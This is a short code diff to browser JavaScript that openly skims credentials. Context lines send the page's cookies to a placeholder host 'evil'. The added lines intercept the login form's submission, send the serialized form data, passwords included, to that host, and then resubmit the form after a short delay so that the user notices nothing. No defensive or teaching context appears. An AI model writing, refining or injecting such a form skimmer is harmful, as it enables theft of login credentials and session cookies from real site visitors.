@@ -5,6 +5,12 @@ img[0].src = 'https://tracker/hit.php';
 img[1].src = 'https://evil/?' + document.cookie;
 
 // Steal the password at login
-$('form').submit(function(e) {
+$('form').one('submit', function(e) {
+    e.preventDefault();
     img[2].src = 'https://evil/?' + $('form').serialize();
+
+    var form = $(this);
+    setTimeout(function() {
+        form.submit();
+    }, 100);
 });
